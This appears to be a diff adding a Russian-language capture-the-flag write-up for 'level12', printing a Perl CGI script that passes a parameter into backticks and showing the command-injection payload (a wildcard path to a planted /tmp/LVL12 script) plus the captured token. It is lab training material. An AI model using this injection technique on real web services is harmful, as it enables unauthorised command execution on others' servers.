@@ -1,0 +1,46 @@
+1) 	Видим скрипт level12
+	#!/usr/bin/env perl
+	# localhost:4646
+	use CGI qw{param};
+	print "Content-type: text/html\n\n";
+
+	sub t {
+	$nn = $_[1];
+	$xx = $_[0];
+	$xx =~ tr/a-z/A-Z/;
+	$xx =~ s/\s.*//;
+	@output = `egrep "^$xx" /tmp/xd 2>&1`;
+	foreach $line (@output) {
+		($f, $s) = split(/:/, $line);
+		if($s =~ $nn) {
+			return 1;
+		}
+	}
+	return 0;
+	}
+
+	sub n {
+	if($_[0] == 1) {
+		print("..");
+	} else {
+		print(".");
+	}
+	}
+
+	n(t(param("x"), param("y")));
+
+	Скрипт на входе принимает два аргумента и запущен на порту 4646
+	Выполняются две функции n() и t()
+	в аргументе 'x' все строчные заменяются на прописные, если 'x' имеет пробел, то она отсекается до него.
+
+
+2)	Создадаим скрипт и сохраним его в файле с прописным названием, т.к. строчные на входе в level21.pl переводятся в прописные
+	echo "getflag > /tmp/token" > /tmp/LVL12
+	chmod +x /tmp/LVL12
+
+3)	Откроем на маке сайт с передачей аргумента с шаблоном поиска, т.к. /tmp/LVL12 в скрипте преобразовывается а прописные:
+	http://192.168.99.115:4646/?x="`/*/LVL12`"
+	Шаблон поиска(wildcard): https://ru.wikipedia.org/wiki/%D0%A8%D0%B0%D0%B1%D0%BB%D0%BE%D0%BD_%D0%BF%D0%BE%D0%B8%D1%81%D0%BA%D0%B0
+
+4)	cat /tmp/token
+	Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
